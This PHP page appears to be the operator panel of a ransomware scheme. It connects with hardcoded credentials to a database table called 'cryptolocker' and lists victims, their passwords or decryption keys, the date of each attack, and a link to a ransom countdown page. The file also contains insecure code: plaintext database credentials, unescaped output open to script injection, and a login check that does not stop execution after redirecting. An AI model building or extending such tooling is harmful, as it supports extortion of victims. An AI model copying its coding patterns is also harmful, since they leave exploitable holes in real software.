<?php
session_start();
?>
<!DOCTYPE html>
<html>
  <head>

    <meta charset="utf-8">

    <title>Password</title>

    <!-- Bootstrap Core CSS -->
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,300italic,400italic,700italic" rel="stylesheet" type="text/css">
    <link href="vendor/simple-line-icons/css/simple-line-icons.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="css/stylish-portfolio.min.css" rel="stylesheet">

  </head>

<body id="page-top" class="content-section bg-light">
<?php
	if(!isset($_SESSION['email'])){
		header("Location: login.php");
	}
?>
	
	<section  id="codifica">
      <div class="container text-center">
		<div class="content-section-heading">
          <h2 class="mb-5" style="color:#1d809f;">Lettura Password</h2>
		  <h3 class="mb-5">
			<a class='btn btn-info' role='button' href="index.php" style="font-size:1vw;">Home</a>
			<a class='btn btn-info' role='button' href="logout.php" style="font-size:1vw;">Logout</a>
		  </h3>
        </div>
        <div class="row">
          <div class="col-lg-10 mx-auto">
            <table class="table table-hover">
				<tr>
					<th>Utenti</th>
					<th>Password</th>
					<th>Data dell'attacco</th>
					<th></th>
				</tr>

<?php
$host = "sql.divini5g.com";
$user = "divini5g07622";
$pass = "gucci";
$nome = "divini5g07622";
$tab_nome = "cryptolocker";

mysql_connect($host,$user,$pass) or die("Impossibile collegarsi al server");
@mysql_select_db("$nome") or die("Impossibile connettersi al database $nome");

$sqlquery = "SELECT * FROM $tab_nome";
$result = mysql_query($sqlquery);
while ($row= mysql_fetch_array($result))
{
	$utente = $row['utente'];
	echo "<tr>";
	echo "<td>";
	echo $row['utente'];
	echo "</td>";
	echo "<td>";
	echo $row['password'];
	echo "</td>";
	echo "<td>";
	echo $row['data'];
	echo "</td>";
	echo "<td>";
	echo "<a href='https://www.divini5g.com/cryptolocker/countdown.php?utente=$utente' class='btn btn-warning' role='button' target='_blank'>CountDown</a> ";
	echo "</td>" ;
	echo "</tr>";
}
mysql_close();
?>
</table>
          </div>
        </div>
      </div>
    </section>

	<!-- Scroll to Top Button-->
    <a class="scroll-to-top rounded js-scroll-trigger" href="#page-top">
      <i class="fa fa-angle-up"></i>
    </a>

    <!-- Bootstrap core JavaScript -->
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

    <!-- Plugin JavaScript -->
    <script src="vendor/jquery-easing/jquery.easing.min.js"></script>

    <!-- Custom scripts for this template -->
    <script src="js/stylish-portfolio.min.js"></script>
	
</body>
</html>